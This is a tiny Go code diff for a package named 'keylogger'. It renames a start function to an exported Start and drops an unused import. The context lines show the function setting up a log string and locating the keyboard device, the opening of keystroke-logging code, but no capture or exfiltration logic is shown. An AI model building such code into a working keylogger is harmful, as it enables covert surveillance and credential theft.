@@ -1,10 +1,6 @@
 package keylogger
 
-import (
-	"time"
-)
-
-func start() {
+func Start() {
 	var logString string = ""
 
 	keyboard := FindKeyboardDevice()
